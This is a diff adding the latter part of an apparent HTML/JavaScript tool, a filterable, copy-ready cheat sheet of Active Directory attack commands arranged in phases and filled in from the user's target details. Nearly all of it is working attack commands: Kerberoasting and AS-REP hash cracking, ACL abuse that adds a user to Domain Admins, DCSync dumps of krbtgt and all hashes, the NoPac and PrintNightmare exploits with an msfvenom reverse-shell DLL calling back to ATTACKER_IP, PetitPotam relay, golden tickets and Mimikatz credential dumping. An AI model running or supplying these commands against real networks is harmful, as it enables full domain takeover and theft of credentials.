+{p:"Phase 7: Security",t:"Get-LAPSComputers",d:"Find computers with LAPS",c:"LAPS",tool:"LAPSToolkit",os:"windows",auth:"required",cmd:"Get-LAPSComputers"},
+{p:"Phase 7: Security",t:"Disable NBT-NS",d:"PowerShell to disable NBT-NS",c:"Defenses",tool:"PowerShell",os:"windows",auth:"required",cmd:"$regkey = 'HKLM:SYSTEM\\CurrentControlSet\\services\\NetBT\\Parameters\\Interfaces'\nGet-ChildItem $regkey | foreach { Set-ItemProperty -Path \"$regkey\\$($_.pschildname)\" -Name NetbiosOptions -Value 2 -Verbose}"},
+
+// PHASE 8: KERBEROASTING  
+{p:"Phase 8: Kerberoasting",t:"GetUserSPNs - List",d:"List Kerberoastable accounts",c:"Kerberoast",tool:"Impacket",os:"linux",auth:"required",cmd:"impacket-GetUserSPNs -dc-ip {DC_IP} {DOMAIN}/{USERNAME}"},
+{p:"Phase 8: Kerberoasting",t:"GetUserSPNs - Request",d:"Request all TGS tickets",c:"Kerberoast",tool:"Impacket",os:"linux",auth:"required",cmd:"impacket-GetUserSPNs -dc-ip {DC_IP} {DOMAIN}/{USERNAME} -request"},
+{p:"Phase 8: Kerberoasting",t:"GetUserSPNs - Target",d:"Kerberoast specific user",c:"Kerberoast",tool:"Impacket",os:"linux",auth:"required",cmd:"impacket-GetUserSPNs -dc-ip {DC_IP} {DOMAIN}/{USERNAME} -request-user {TARGET_USER}"},
+{p:"Phase 8: Kerberoasting",t:"GetUserSPNs - Output",d:"Save TGS to file",c:"Kerberoast",tool:"Impacket",os:"linux",auth:"required",cmd:"impacket-GetUserSPNs -dc-ip {DC_IP} {DOMAIN}/{USERNAME} -request-user {TARGET_USER} -outputfile {TARGET_USER}_tgs.txt"},
+{p:"Phase 8: Kerberoasting",t:"setspn - Enum",d:"Windows native SPN enumeration",c:"Kerberoast",tool:"setspn",os:"windows",auth:"required",cmd:"setspn.exe -Q */*"},
+{p:"Phase 8: Kerberoasting",t:"setspn - Domain",d:"Enumerate all SPNs in domain",c:"Kerberoast",tool:"setspn",os:"windows",auth:"required",cmd:"setspn.exe -T {DOMAIN} -Q */*"},
+{p:"Phase 8: Kerberoasting",t:"PowerView - Kerberoast",d:"Get TGS with PowerView",c:"Kerberoast",tool:"PowerView",os:"windows",auth:"required",cmd:"Import-Module .\\PowerView.ps1\nGet-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\\tgs.csv -NoTypeInformation"},
+{p:"Phase 8: Kerberoasting",t:"PowerView - Single User",d:"Kerberoast specific user",c:"Kerberoast",tool:"PowerView",os:"windows",auth:"required",cmd:"Get-DomainUser -Identity {TARGET_USER} | Get-DomainSPNTicket -Format Hashcat"},
+{p:"Phase 8: Kerberoasting",t:"Rubeus - Stats",d:"Get Kerberoast statistics",c:"Kerberoast",tool:"Rubeus",os:"windows",auth:"required",cmd:".\\Rubeus.exe kerberoast /stats"},
+{p:"Phase 8: Kerberoasting",t:"Rubeus - All SPNs",d:"Kerberoast all accounts",c:"Kerberoast",tool:"Rubeus",os:"windows",auth:"required",cmd:".\\Rubeus.exe kerberoast /nowrap"},
+{p:"Phase 8: Kerberoasting",t:"Rubeus - AdminCount",d:"Kerberoast admin accounts",c:"Kerberoast",tool:"Rubeus",os:"windows",auth:"required",cmd:".\\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap"},
+{p:"Phase 8: Kerberoasting",t:"Rubeus - Target User",d:"Kerberoast specific user",c:"Kerberoast",tool:"Rubeus",os:"windows",auth:"required",cmd:".\\Rubeus.exe kerberoast /user:{TARGET_USER} /nowrap"},
+{p:"Phase 8: Kerberoasting",t:"Hashcat - TGS",d:"Crack Kerberoast hashes",c:"Cracking",tool:"Hashcat",os:"linux",auth:"none",cmd:"hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt --force"},
+{p:"Phase 8: Kerberoasting",t:"Mimikatz - Export",d:"Export Kerberos tickets",c:"Kerberoast",tool:"Mimikatz",os:"windows",auth:"required",cmd:"mimikatz # kerberos::list /export"},
+
+// PHASE 9: AS-REP ROASTING
+{p:"Phase 9: AS-REP",t:"GetNPUsers - User List",d:"AS-REP roast from user list",c:"AS-REP",tool:"Impacket",os:"linux",auth:"none",cmd:"impacket-GetNPUsers -dc-ip {DC_IP} -usersfile users.txt -format hashcat -outputfile asrep.txt {DOMAIN}/"},
+{p:"Phase 9: AS-REP",t:"GetNPUsers - Creds",d:"AS-REP roast with creds",c:"AS-REP",tool:"Impacket",os:"linux",auth:"required",cmd:"impacket-GetNPUsers -dc-ip {DC_IP} {DOMAIN}/{USERNAME} -request"},
+{p:"Phase 9: AS-REP",t:"Rubeus - ASREProast",d:"AS-REP roast from Windows",c:"AS-REP",tool:"Rubeus",os:"windows",auth:"none",cmd:".\\Rubeus.exe asreproast /user:{TARGET_USER} /nowrap /format:hashcat"},
+{p:"Phase 9: AS-REP",t:"Rubeus - All Users",d:"AS-REP roast all vulnerable",c:"AS-REP",tool:"Rubeus",os:"windows",auth:"none",cmd:".\\Rubeus.exe asreproast /nowrap /format:hashcat"},
+{p:"Phase 9: AS-REP",t:"Hashcat - AS-REP",d:"Crack AS-REP hashes",c:"Cracking",tool:"Hashcat",os:"linux",auth:"none",cmd:"hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --force"},
+
+// PHASE 10: ACL ATTACKS
+{p:"Phase 10: ACL",t:"Find-InterestingDomainAcl",d:"Find exploitable ACLs",c:"ACL",tool:"PowerView",os:"windows",auth:"required",cmd:"Find-InterestingDomainAcl"},
+{p:"Phase 10: ACL",t:"Get User ACLs",d:"Objects user has rights over",c:"ACL",tool:"PowerView",os:"windows",auth:"required",cmd:"$sid = Convert-NameToSid {USERNAME}\nGet-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}"},
+{p:"Phase 10: ACL",t:"ACL with GUIDs",d:"Resolve GUIDs in output",c:"ACL",tool:"PowerView",os:"windows",auth:"required",cmd:"Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}"},
+{p:"Phase 10: ACL",t:"ForceChangePassword",d:"Reset user password",c:"ACL Abuse",tool:"PowerView",os:"windows",auth:"required",cmd:"$SecPassword = ConvertTo-SecureString 'NewP@ss123!' -AsPlainText -Force\nSet-DomainUserPassword -Identity {TARGET_USER} -AccountPassword $SecPassword -Verbose"},
+{p:"Phase 10: ACL",t:"Add-DomainGroupMember",d:"Add user to group",c:"ACL Abuse",tool:"PowerView",os:"windows",auth:"required",cmd:"Add-DomainGroupMember -Identity 'Domain Admins' -Members '{USERNAME}' -Verbose"},
+{p:"Phase 10: ACL",t:"Set Fake SPN",d:"Add SPN for Kerberoasting",c:"ACL Abuse",tool:"PowerView",os:"windows",auth:"required",cmd:"Set-DomainObject -Identity {TARGET_USER} -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose"},
+{p:"Phase 10: ACL",t:"Clear Fake SPN",d:"Remove fake SPN (cleanup)",c:"ACL Abuse",tool:"PowerView",os:"windows",auth:"required",cmd:"Set-DomainObject -Identity {TARGET_USER} -Clear serviceprincipalname -Verbose"},
+{p:"Phase 10: ACL",t:"Remove from Group",d:"Remove user from group",c:"ACL Abuse",tool:"PowerView",os:"windows",auth:"required",cmd:"Remove-DomainGroupMember -Identity 'Help Desk Level 1' -Members '{USERNAME}' -Verbose"},
+
+// PHASE 11: DCSYNC
+{p:"Phase 11: DCSync",t:"Check DCSync Rights",d:"Verify DCSync permissions",c:"DCSync",tool:"PowerView",os:"windows",auth:"required",cmd:"$sid = Convert-NameToSid {USERNAME}\nGet-ObjectAcl 'DC={DOMAIN_SHORT},DC=LOCAL' -ResolveGUIDs | ? {($_.ObjectAceType -match 'Replication-Get') -and ($_.SecurityIdentifier -match $sid)}"},
+{p:"Phase 11: DCSync",t:"secretsdump - All",d:"DCSync all hashes",c:"DCSync",tool:"Impacket",os:"linux",auth:"required",cmd:"impacket-secretsdump -outputfile inlanefreight_hashes -just-dc {DOMAIN}/{USERNAME}@{DC_IP} -use-vss"},
+{p:"Phase 11: DCSync",t:"secretsdump - NTDS",d:"DCSync NTDS.dit only",c:"DCSync",tool:"Impacket",os:"linux",auth:"required",cmd:"impacket-secretsdump -just-dc {DOMAIN}/{USERNAME}:'{PASSWORD}'@{DC_IP}"},
+{p:"Phase 11: DCSync",t:"secretsdump - User",d:"DCSync specific user",c:"DCSync",tool:"Impacket",os:"linux",auth:"required",cmd:"impacket-secretsdump -just-dc-user {TARGET_USER} {DOMAIN}/{USERNAME}:'{PASSWORD}'@{DC_IP}"},
+{p:"Phase 11: DCSync",t:"secretsdump - krbtgt",d:"DCSync krbtgt for Golden Ticket",c:"DCSync",tool:"Impacket",os:"linux",auth:"required",cmd:"impacket-secretsdump -just-dc-user krbtgt {DOMAIN}/{USERNAME}:'{PASSWORD}'@{DC_IP}"},
+{p:"Phase 11: DCSync",t:"secretsdump - PTH",d:"DCSync with NTLM hash",c:"DCSync",tool:"Impacket",os:"linux",auth:"required",cmd:"impacket-secretsdump '{DC_NAME}$'@{DC_IP} -hashes :{NTHASH}"},
+{p:"Phase 11: DCSync",t:"Mimikatz - DCSync",d:"DCSync via Mimikatz",c:"DCSync",tool:"Mimikatz",os:"windows",auth:"required",cmd:"mimikatz # lsadump::dcsync /domain:{DOMAIN} /user:{DOMAIN_SHORT}\\administrator"},
+{p:"Phase 11: DCSync",t:"Mimikatz - krbtgt",d:"DCSync krbtgt hash",c:"DCSync",tool:"Mimikatz",os:"windows",auth:"required",cmd:"mimikatz # lsadump::dcsync /user:{DOMAIN_SHORT}\\krbtgt"},
+
+// PHASE 12: PRIVILEGED ACCESS
+{p:"Phase 12: Priv Access",t:"RDP Users Enum",d:"Find Remote Desktop users",c:"Access",tool:"PowerView",os:"windows",auth:"required",cmd:"Get-NetLocalGroupMember -ComputerName {DC_NAME} -GroupName 'Remote Desktop Users'"},
+{p:"Phase 12: Priv Access",t:"WinRM Users Enum",d:"Find WinRM users",c:"Access",tool:"PowerView",os:"windows",auth:"required",cmd:"Get-NetLocalGroupMember -ComputerName {DC_NAME} -GroupName 'Remote Management Users'"},
+{p:"Phase 12: Priv Access",t:"Enter-PSSession",d:"PowerShell remoting",c:"Access",tool:"PowerShell",os:"windows",auth:"required",cmd:"$password = ConvertTo-SecureString '{PASSWORD}' -AsPlainText -Force\n$cred = New-Object System.Management.Automation.PSCredential('{DOMAIN}\\{USERNAME}', $password)\nEnter-PSSession -ComputerName {DC_NAME} -Credential $cred"},
+{p:"Phase 12: Priv Access",t:"PowerUpSQL - Find",d:"Discover SQL instances",c:"SQL",tool:"PowerUpSQL",os:"windows",auth:"required",cmd:"Import-Module .\\PowerUpSQL.ps1\nGet-SQLInstanceDomain"},
+{p:"Phase 12: Priv Access",t:"PowerUpSQL - Query",d:"Query SQL Server",c:"SQL",tool:"PowerUpSQL",os:"windows",auth:"required",cmd:"Get-SQLQuery -Verbose -Instance '{TARGET_HOST},1433' -username '{DOMAIN_SHORT}\\{USERNAME}' -password '{PASSWORD}' -query 'Select @@version'"},
+{p:"Phase 12: Priv Access",t:"mssqlclient.py",d:"MSSQL from Linux",c:"SQL",tool:"Impacket",os:"linux",auth:"required",cmd:"impacket-mssqlclient {DOMAIN}/{USERNAME}@{TARGET_HOST} -windows-auth"},
+{p:"Phase 12: Priv Access",t:"xp_cmdshell Enable",d:"Enable command execution",c:"SQL",tool:"MSSQL",os:"both",auth:"required",cmd:"EXEC sp_configure 'show advanced options', 1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"},
+
+// PHASE 13: NOPAC
+{p:"Phase 13: NoPac",t:"NoPac - Scanner",d:"Check CVE-2021-42278/42287",c:"CVE",tool:"NoPac",os:"linux",auth:"required",cmd:"sudo python3 scanner.py {DOMAIN}/{USERNAME}:'{PASSWORD}' -dc-ip {DC_IP} -use-ldap"},
+{p:"Phase 13: NoPac",t:"NoPac - Shell",d:"Exploit for SYSTEM shell",c:"CVE",tool:"NoPac",os:"linux",auth:"required",cmd:"sudo python3 noPac.py {DOMAIN}/{USERNAME}:'{PASSWORD}' -dc-ip {DC_IP} -dc-host {DC_NAME} -shell --impersonate administrator -use-ldap"},
+{p:"Phase 13: NoPac",t:"NoPac - DCSync",d:"NoPac to DCSync",c:"CVE",tool:"NoPac",os:"linux",auth:"required",cmd:"sudo python3 noPac.py {DOMAIN}/{USERNAME}:'{PASSWORD}' -dc-ip {DC_IP} -dc-host {DC_NAME} --impersonate administrator -use-ldap -dump -just-dc-user {DOMAIN_SHORT}/administrator"},
+
+// PHASE 14: PRINTNIGHTMARE
+{p:"Phase 14: PrintNightmare",t:"Check MS-RPRN",d:"Check Print Spooler RPC",c:"CVE",tool:"Impacket",os:"linux",auth:"none",cmd:"rpcdump.py @{DC_IP} | egrep 'MS-RPRN|MS-PAR'"},
+{p:"Phase 14: PrintNightmare",t:"Generate DLL",d:"Create malicious DLL",c:"CVE",tool:"msfvenom",os:"linux",auth:"none",cmd:"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ATTACKER_IP} LPORT=8080 -f dll > backupscript.dll"},
+{p:"Phase 14: PrintNightmare",t:"Host DLL",d:"SMB server for payload",c:"CVE",tool:"Impacket",os:"linux",auth:"none",cmd:"sudo smbserver.py -smb2support CompData /path/to/backupscript.dll"},
+{p:"Phase 14: PrintNightmare",t:"Exploit",d:"Execute PrintNightmare",c:"CVE",tool:"CVE-2021-1675",os:"linux",auth:"required",cmd:"sudo python3 CVE-2021-1675.py {DOMAIN}/{USERNAME}:'{PASSWORD}'@{DC_IP} '\\\\{ATTACKER_IP}\\CompData\\backupscript.dll'"},
+{p:"Phase 14: PrintNightmare",t:"Get-SpoolStatus",d:"Check Spooler from Windows",c:"CVE",tool:"SecurityAssessment",os:"windows",auth:"required",cmd:"Import-Module .\\SecurityAssessment.ps1\nGet-SpoolStatus -ComputerName {DC_NAME}"},
+
+// PHASE 15: PETITPOTAM
+{p:"Phase 15: PetitPotam",t:"NTLM Relay",d:"Relay to ADCS enrollment",c:"CVE",tool:"Impacket",os:"linux",auth:"none",cmd:"sudo ntlmrelayx.py -debug -smb2support --target http://{DC_NAME}/certsrv/certfnsh.asp --adcs --template DomainController"},
+{p:"Phase 15: PetitPotam",t:"PetitPotam",d:"Coerce DC authentication",c:"CVE",tool:"PetitPotam",os:"linux",auth:"none",cmd:"python3 PetitPotam.py {ATTACKER_IP} {DC_IP}"},
+{p:"Phase 15: PetitPotam",t:"TGT from Cert",d:"Get TGT using certificate",c:"CVE",tool:"PKINITtools",os:"linux",auth:"none",cmd:"python3 /opt/PKINITtools/gettgtpkinit.py {DOMAIN}/{DC_NAME}$ -pfx-base64 <base64_cert> dc01.ccache"},
+{p:"Phase 15: PetitPotam",t:"Set KRB5CCNAME",d:"Set ticket cache",c:"CVE",tool:"Bash",os:"linux",auth:"none",cmd:"export KRB5CCNAME=dc01.ccache"},
+{p:"Phase 15: PetitPotam",t:"DCSync via Kerberos",d:"DCSync with Kerberos",c:"CVE",tool:"Impacket",os:"linux",auth:"none",cmd:"impacket-secretsdump -just-dc-user {DOMAIN_SHORT}/administrator -k -no-pass '{DC_NAME}$'@{DC_NAME}"},
+{p:"Phase 15: PetitPotam",t:"Get NT Hash",d:"Get hash from cert",c:"CVE",tool:"PKINITtools",os:"linux",auth:"none",cmd:"python3 /opt/PKINITtools/getnthash.py -key <session_key> {DOMAIN}/{DC_NAME}$"},
+{p:"Phase 15: PetitPotam",t:"Rubeus TGT",d:"Request TGT and PTT",c:"CVE",tool:"Rubeus",os:"windows",auth:"none",cmd:".\\Rubeus.exe asktgt /user:{DC_NAME}$ /<base64_cert>=/ptt"},
+
+// PHASE 16: GPP PASSWORDS
+{p:"Phase 16: GPP",t:"gpp-decrypt",d:"Decrypt GPP cpassword",c:"GPO",tool:"gpp-decrypt",os:"linux",auth:"none",cmd:"gpp-decrypt '<cpassword>'"},
+{p:"Phase 16: GPP",t:"CME - GPP",d:"Find GPP passwords",c:"GPO",tool:"CrackMapExec",os:"linux",auth:"required",cmd:"crackmapexec smb -L | grep gpp"},
+{p:"Phase 16: GPP",t:"CME - Autologin",d:"Find autologin credentials",c:"GPO",tool:"CrackMapExec",os:"linux",auth:"required",cmd:"crackmapexec smb {DC_IP} -u {USERNAME} -p '{PASSWORD}' -M gpp_autologin"},
+{p:"Phase 16: GPP",t:"Get-DomainGPO",d:"List all GPOs",c:"GPO",tool:"PowerView",os:"windows",auth:"required",cmd:"Get-DomainGPO | Select-Object displayname"},
+{p:"Phase 16: GPP",t:"Get-GPO",d:"Native GPO enumeration",c:"GPO",tool:"PowerShell",os:"windows",auth:"required",cmd:"Get-GPO -All | Select-Object DisplayName"},
+{p:"Phase 16: GPP",t:"GPO Permissions",d:"Find modifiable GPOs",c:"GPO",tool:"PowerView",os:"windows",auth:"required",cmd:"$sid = Convert-NameToSid 'Domain Users'\nGet-DomainGPO | Get-ObjectAcl | ? {$_.SecurityIdentifier -eq $sid}"},
+{p:"Phase 16: GPP",t:"SYSVOL Scripts",d:"List scripts in SYSVOL",c:"GPO",tool:"PowerShell",os:"windows",auth:"required",cmd:"ls \\\\{DC_NAME}\\SYSVOL\\{DOMAIN}\\scripts"},
+
+// PHASE 17: TRUST ATTACKS
+{p:"Phase 17: Trusts",t:"Get-ADTrust",d:"Enumerate domain trusts",c:"Trusts",tool:"PowerShell",os:"windows",auth:"required",cmd:"Import-Module activedirectory\nGet-ADTrust -Filter *"},
+{p:"Phase 17: Trusts",t:"lookupsid.py",d:"Enumerate SIDs",c:"Trusts",tool:"Impacket",os:"linux",auth:"required",cmd:"impacket-lookupsid {DOMAIN}/{USERNAME}@{DC_IP}"},
+{p:"Phase 17: Trusts",t:"Get Domain SID",d:"Get SID for trust attacks",c:"Trusts",tool:"Impacket",os:"linux",auth:"required",cmd:"impacket-lookupsid {DOMAIN}/{USERNAME}@{DC_IP} | grep 'Domain SID'"},
+{p:"Phase 17: Trusts",t:"Get EA SID",d:"Get Enterprise Admins SID",c:"Trusts",tool:"Impacket",os:"linux",auth:"required",cmd:"impacket-lookupsid {DOMAIN}/{USERNAME}@{DC_IP} | grep -B12 'Enterprise Admins'"},
+{p:"Phase 17: Trusts",t:"DCSync krbtgt",d:"Get child domain krbtgt",c:"Trusts",tool:"Mimikatz",os:"windows",auth:"required",cmd:"mimikatz # lsadump::dcsync /user:{DOMAIN_SHORT}\\krbtgt"},
+{p:"Phase 17: Trusts",t:"Get-DomainSID",d:"Get child domain SID",c:"Trusts",tool:"PowerView",os:"windows",auth:"required",cmd:"Get-DomainSID"},
+{p:"Phase 17: Trusts",t:"EA SID PowerView",d:"Get Enterprise Admins SID",c:"Trusts",tool:"PowerView",os:"windows",auth:"required",cmd:"Get-DomainGroup -Domain {DOMAIN} -Identity 'Enterprise Admins' | Select-Object distinguishedname,objectsid"},
+{p:"Phase 17: Trusts",t:"Golden Ticket",d:"Create with ExtraSID",c:"Trusts",tool:"Mimikatz",os:"windows",auth:"required",cmd:"mimikatz # kerberos::golden /user:hacker /domain:{DOMAIN} /sid:<CHILD_SID> /krbtgt:<KRBTGT_HASH> /sids:<EA_SID> /ptt"},
+{p:"Phase 17: Trusts",t:"Rubeus Golden",d:"Create via Rubeus",c:"Trusts",tool:"Rubeus",os:"windows",auth:"required",cmd:".\\Rubeus.exe golden /rc4:<KRBTGT_HASH> /domain:{DOMAIN} /sid:<CHILD_SID> /sids:<EA_SID> /user:hacker /ptt"},
+{p:"Phase 17: Trusts",t:"ticketer.py",d:"Golden Ticket from Linux",c:"Trusts",tool:"Impacket",os:"linux",auth:"none",cmd:"impacket-ticketer -nthash <KRBTGT_HASH> -domain {DOMAIN} -domain-sid <CHILD_SID> -extra-sid <EA_SID> hacker"},
+{p:"Phase 17: Trusts",t:"Use Golden Ticket",d:"Access with ticket",c:"Trusts",tool:"Impacket",os:"linux",auth:"none",cmd:"export KRB5CCNAME=hacker.ccache\nimpacket-psexec {DOMAIN}/hacker@{DC_NAME} -k -no-pass -target-ip {DC_IP}"},
+{p:"Phase 17: Trusts",t:"raiseChild.py",d:"Auto child->parent escalation",c:"Trusts",tool:"Impacket",os:"linux",auth:"required",cmd:"impacket-raiseChild -target-exec {DC_IP} {DOMAIN}/{USERNAME}"},
+
+// PHASE 18: CROSS-FOREST
+{p:"Phase 18: Cross-Forest",t:"Foreign Users",d:"Users in foreign domains",c:"Cross-Forest",tool:"PowerView",os:"windows",auth:"required",cmd:"Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | Select-Object SamAccountName"},
+{p:"Phase 18: Cross-Forest",t:"Kerberoast X-Forest",d:"Kerberoast across forest",c:"Cross-Forest",tool:"Rubeus",os:"windows",auth:"required",cmd:".\\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap"},
+{p:"Phase 18: Cross-Forest",t:"GetUserSPNs X-Forest",d:"Kerberoast from Linux",c:"Cross-Forest",tool:"Impacket",os:"linux",auth:"required",cmd:"impacket-GetUserSPNs -request -target-domain FREIGHTLOGISTICS.LOCAL {DOMAIN}/{USERNAME}"},
+{p:"Phase 18: Cross-Forest",t:"Foreign Group Members",d:"Members from other domains",c:"Cross-Forest",tool:"PowerView",os:"windows",auth:"required",cmd:"Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL"},
+{p:"Phase 18: Cross-Forest",t:"Enter-PSSession X-Forest",d:"PS session across forest",c:"Cross-Forest",tool:"PowerShell",os:"windows",auth:"required",cmd:"Enter-PSSession -ComputerName {DC_NAME}.FREIGHTLOGISTICS.LOCAL -Credential {DOMAIN}\\administrator"},
+
+// PHASE 19: MISC
+{p:"Phase 19: Misc",t:"adidnsdump",d:"Dump AD-integrated DNS",c:"DNS",tool:"adidnsdump",os:"linux",auth:"required",cmd:"adidnsdump -u '{DOMAIN_SHORT}\\{USERNAME}' ldap://{DC_IP}"},
+{p:"Phase 19: Misc",t:"adidnsdump - Resolve",d:"Resolve unknown DNS records",c:"DNS",tool:"adidnsdump",os:"linux",auth:"required",cmd:"adidnsdump -u '{DOMAIN_SHORT}\\{USERNAME}' ldap://{DC_IP} -r"},
+{p:"Phase 19: Misc",t:"Passwords in Desc",d:"Find passwords in descriptions",c:"Misc",tool:"PowerView",os:"windows",auth:"required",cmd:"Get-DomainUser * | Select-Object samaccountname,description"},
+{p:"Phase 19: Misc",t:"PASSWD_NOTREQD",d:"Users without password req",c:"Misc",tool:"PowerView",os:"windows",auth:"required",cmd:"Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol"},
+{p:"Phase 19: Misc",t:"Mimikatz - Creds",d:"Dump credentials",c:"Cred Dump",tool:"Mimikatz",os:"windows",auth:"required",cmd:"mimikatz # privilege::debug\nmimikatz # sekurlsa::logonpasswords"},
+{p:"Phase 19: Misc",t:"klist",d:"View Kerberos cache",c:"Misc",tool:"Native",os:"linux",auth:"none",cmd:"klist"},
+{p:"Phase 19: Misc",t:"Zip BloodHound",d:"Compress BH JSON files",c:"Misc",tool:"zip",os:"linux",auth:"none",cmd:"zip -r bloodhound_data.zip *.json"}
+];
+
+let cfg={},filtered=[...cmds];
+function load(){cfg={DC_NAME:v('dcName')||'{DC_NAME}',DC_IP:v('dcIP')||'{DC_IP}',DOMAIN:v('domain')||'{DOMAIN}',DOMAIN_SHORT:v('domainShort')||'{DOMAIN_SHORT}',TARGET_HOST:v('targetHost')||'{TARGET_HOST}',ATTACKER_IP:v('attackerIP')||'{ATTACKER_IP}',USERNAME:v('username')||'{USERNAME}',PASSWORD:v('password')||'{PASSWORD}',NTHASH:v('ntHash')||'{NTHASH}',TARGET_USER:v('targetUser')||'{TARGET_USER}',INTERFACE:v('iface')||'eth0'};const d=cfg.DOMAIN.split('.');cfg.BASE_DN=d.map(x=>`DC=${x}`).join(',');cfg.NETWORK=/^\d+\.\d+\.\d+\.\d+$/.test(cfg.DC_IP)?cfg.DC_IP.split('.').slice(0,3).join(''):'{NETWORK}';showTgt();popPhases();render()}
+function v(id){return document.getElementById(id).value.trim()}
+function reset(){['dcName','dcIP','domain','domainShort','targetHost','attackerIP','username','password','ntHash','targetUser','iface'].forEach(x=>document.getElementById(x).value='');cfg={};document.getElementById('tgt').classList.remove('active');filtered=[...cmds];render()}
+function exp(){if(!Object.keys(cfg).length)load();const t=Object.entries(cfg).map(([k,v])=>`export ${k}="${v}"`).join('\n');const b=new Blob([`#!/bin/bash\n# AD Config\n${t}\n`],{type:'text/plain'});const a=document.createElement('a');a.href=URL.createObjectURL(b);a.download=`ad_config.sh`;a.click()}
+function showTgt(){const el=document.getElementById('tgtInfo');el.innerHTML='';[['DC',cfg.DC_NAME],['IP',cfg.DC_IP],['Domain',cfg.DOMAIN],['User',cfg.USERNAME],['Auth',cfg.PASSWORD!=='{PASSWORD}'?'✓':'✗']].forEach(([k,v])=>el.innerHTML+=`<div class="target-row"><span class="k">${k}</span><span class="v">${v}</span></div>`);document.getElementById('tgt').classList.add('active')}
+function popPhases(){const s=document.getElementById('phaseF');s.innerHTML='<option value="">All Phases</option>';[...new Set(cmds.map(c=>c.p))].forEach(p=>s.innerHTML+=`<option value="${p}">${p}</option>`)}
+function filter(){const s=document.getElementById('search').value.toLowerCase(),p=document.getElementById('phaseF').value,c=document.getElementById('credF').value,o=document.getElementById('osF').value;filtered=cmds.filter(cmd=>(!s||cmd.t.toLowerCase().includes(s)||cmd.d.toLowerCase().includes(s)||cmd.tool.toLowerCase().includes(s)||cmd.cmd.toLowerCase().includes(s))&&(!p||cmd.p===p)&&(!c||cmd.auth===c)&&(!o||cmd.os===o));render()}
+function clearF(){document.getElementById('search').value='';document.getElementById('phaseF').value='';document.getElementById('credF').value='';document.getElementById('osF').value='';filtered=[...cmds];render()}
+function qf(t){if(t==='none'){document.getElementById('credF').value='none';document.getElementById('search').value=''}else{document.getElementById('credF').value='';document.getElementById('search').value=t}filter()}
+function render(){const con=document.getElementById('container');if(!filtered.length){con.innerHTML='<div class="empty"><div class="icon">🔍</div><h3>No commands found</h3></div>';stats();return}const g={};filtered.forEach(c=>{if(!g[c.p])g[c.p]=[];g[c.p].push(c)});con.innerHTML='';Object.keys(g).sort().forEach(p=>{con.innerHTML+=`<div class="phase"><div class="phase-head" onclick="toggle(this)"><h3>${p}</h3><span>${g[p].length}</span></div><div class="cards">${g[p].map(c=>card(c)).join('')}</div></div>`});stats()}
+function card(c){let cmd=c.cmd;if(Object.keys(cfg).length)Object.keys(cfg).forEach(k=>cmd=cmd.replace(new RegExp(`\\{${k}\\}`,'g'),cfg[k]));const cb=c.auth==='none'?'<span class="badge b-none">No Creds</span>':'<span class="badge b-req">Creds</span>';const ob=c.os==='linux'?'<span class="badge b-linux">Linux</span>':c.os==='windows'?'<span class="badge b-win">Win</span>':'<span class="badge b-both">Both</span>';return `<div class="card" data-cmd="${encodeURIComponent(cmd)}"><div class="card-head"><div class="card-title">${c.t}</div><div class="badges">${cb}${ob}</div></div><div class="card-desc">${c.d}</div><div class="card-meta"><span class="meta">${c.c}</span><span class="meta">${c.tool}</span></div><div class="cmd-box"><div class="cmd-text">${esc(cmd)}</div></div><button class="copy-btn" onclick="copy(this.parentElement)">📋 Copy</button></div>`}
+function copy(el){const cmd=decodeURIComponent(el.dataset.cmd);if(navigator.clipboard&&window.isSecureContext)navigator.clipboard.writeText(cmd).then(()=>ok(el));else{const t=document.createElement('textarea');t.value=cmd;t.style.position='fixed';t.style.left='-9999px';document.body.appendChild(t);t.select();document.execCommand('copy');document.body.removeChild(t);ok(el)}}
+function ok(el){el.classList.add('copied');document.getElementById('toast').classList.add('show');setTimeout(()=>{el.classList.remove('copied');document.getElementById('toast').classList.remove('show')},1500)}
+function toggle(h){h.nextElementSibling.classList.toggle('collapsed')}
+function esc(t){return t.replace(/[&<>"']/g,m=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#039;'})[m])}
+function stats(){document.getElementById('total').textContent=cmds.length;document.getElementById('visible').textContent=filtered.length;let r=0;if(Object.keys(cfg).length)filtered.forEach(c=>{let p=c.cmd;Object.keys(cfg).forEach(k=>p=p.replace(new RegExp(`\\{${k}\\}`,'g'),cfg[k]));if(!p.match(/\{[A-Z_]+\}/))r++});document.getElementById('ready').textContent=r}
+window.onload=()=>{popPhases();load()};
+</script>
+</body>
+</html>
